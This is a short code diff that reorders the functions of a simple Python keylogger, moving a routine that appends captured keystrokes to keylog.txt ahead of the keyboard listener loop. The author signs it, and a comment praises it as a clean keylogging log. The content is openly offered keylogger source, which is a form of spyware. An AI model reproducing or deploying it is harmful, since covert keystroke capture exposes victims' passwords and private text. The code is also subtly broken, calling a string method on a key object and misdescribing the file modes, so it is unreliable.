@@ -18,7 +18,15 @@ def on_press(key):
         write_file(keys)
         keys = []
 
-# Write file goes here (TEMP)
+def write_file(keys):
+    with open("keylog.txt", "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find("space") > 0:
+                f.write('\n')
+            elif key.find("Key") == -1:
+                f.write(k)
+# This adds to a nice, clean log file for keylogging. If needed, change "w" to "a" (for creating a new file)
 
 
 def on_release(key):
@@ -30,14 +38,5 @@ def on_release(key):
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 
-def write_file(keys):
-    with open("keylog.txt", "a") as f:
-        for key in keys:
-            k = str(key).replace("'","")
-            if k.find("space") > 0:
-                f.write('\n')
-            elif key.find("Key") == -1:
-                f.write(k)
-# This adds to a nice, clean log file for keylogging. If needed, change "w" to "a" (for creating a new file)
 
 # Made by Damien/GunFighterMan101
